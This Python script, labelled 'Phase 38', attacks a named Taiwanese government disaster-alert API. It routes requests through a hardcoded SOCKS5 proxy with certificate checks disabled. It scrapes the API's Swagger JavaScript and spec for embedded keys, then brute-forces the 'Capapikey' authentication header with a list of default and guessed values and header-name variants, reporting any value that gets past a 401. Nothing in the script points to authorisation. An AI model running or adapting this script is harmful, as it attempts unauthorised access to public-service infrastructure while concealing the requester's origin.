#!/usr/bin/env python3
"""Phase 38: Find NCDR Capapikey - scan JS files and try broader key set."""
import sys
sys.path.insert(0, '/usr/lib/python3/dist-packages')
import requests, urllib3, json, re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXY = {'https': 'socks5h://202.160.76.154:11085', 'http': 'socks5h://202.160.76.154:11085'}
BASE = 'https://alerts.ncdr.nat.gov.tw/AddValueApi'

# 1. Scan swagger UI JavaScript for embedded keys
print("=== Scan swagger UI JS for Capapikey values ===")
# Get all JS/CSS references from swagger page
r = requests.get(f'{BASE}/swagger', proxies=PROXY, verify=False, timeout=15)
# Find script src references
scripts = re.findall(r'src=["\']([^"\']+\.js)["\']', r.text)
print(f"Scripts found: {scripts}")

for script in scripts:
    script_url = script if script.startswith('http') else f'{BASE}/swagger/{script}'
    # Normalize path
    if not script.startswith('http'):
        script_url = f'{BASE}/swagger/{script.lstrip("./")}'
    try:
        r2 = requests.get(script_url, proxies=PROXY, verify=False, timeout=10)
        if r2.status_code == 200 and len(r2.text) > 10:
            print(f"  {script_url} -> {r2.status_code}, len={len(r2.text)}")
            # Search for key patterns
            for pattern in [r'api[_-]?key', r'apikey', r'capapikey', r'key\s*=', r'token']:
                matches = re.findall(pattern, r2.text, re.I)
                if matches:
                    print(f"    Pattern '{pattern}' found {len(matches)} times")
    except Exception as e:
        print(f"  {script_url} -> ERR: {str(e)[:50]}")

# 2. Try broader key values
print("\n=== Broad Capapikey brute force ===")
keys_to_try = [
    # Common defaults
    'test', '123456', 'admin', 'password', 'key', 'apikey', 'ncdr', 
    'NCDR', 'AddValue', 'addvalue', 'public', 'demo', 'guest', 'default',
    # Government patterns
    'NCDR_API_KEY', 'ncdr_api_key', 'capapikey', 'Capapikey',
    'OpenData', 'opendata', 'data', 'api',
    # Numeric sequences
    '0123456789', '111111', '000000', '1234567890',
    # UUID-like
    '00000000-0000-0000-0000-000000000000',
    # NCDR specific
    'NCDR-OPEN-DATA', 'ncdr-open-data',
    'tw.gov.ncdr', 'gov.tw',
    # Try empty
    '',
]

# Also try the swagger config which mentioned a URL
r = requests.get(f'{BASE}/swagger/v1/swagger.json', proxies=PROXY, verify=False, timeout=15)
spec = r.json()
# Check if any endpoint has an example key
print("\n=== Checking spec for key examples ===")
full_text = json.dumps(spec, ensure_ascii=False)
key_examples = re.findall(r'(?:Capapikey|apikey|api_key|key)["\s:=]+["\']([^"\']{5,})["\']', full_text, re.I)
print(f"Potential keys in spec: {key_examples}")

# Check swagger config
r2 = requests.get(f'{BASE}/swagger/config', proxies=PROXY, verify=False, timeout=10)
print(f"\n/swagger/config -> {r2.status_code}, len={len(r2.text)}")
if r2.status_code == 200:
    key_in_config = re.findall(r'(?:Capapikey|apikey|key)["\s:=]+["\']([^"\']{5,})["\']', r2.text, re.I)
    print(f"Keys in config: {key_in_config}")

# Try the keys
for key in keys_to_try:
    r = requests.get(f'{BASE}/EventCode', proxies=PROXY, timeout=5,
                    headers={'User-Agent': 'Mozilla/5.0', 'Capapikey': key, 'Accept': 'application/json'}, verify=False)
    if r.status_code != 401:
        print(f"  Capapikey='{key}' -> {r.status_code} *** FOUND ***")
        print(f"  Body: {r.text[:300]}")

# 3. Try lowercase variant
print("\n=== Header name variations ===")
for hname in ['Capapikey', 'capapikey', 'CAPAPIKEY', 'CapApiKey', 'CAPAPIKEY']:
    r = requests.get(f'{BASE}/EventCode', proxies=PROXY, timeout=5,
                    headers={'User-Agent': 'Mozilla/5.0', hname: 'test', 'Accept': 'application/json'}, verify=False)
    print(f"  {hname}='test' -> {r.status_code}: {r.text[:60]}")

print("\nDone.")
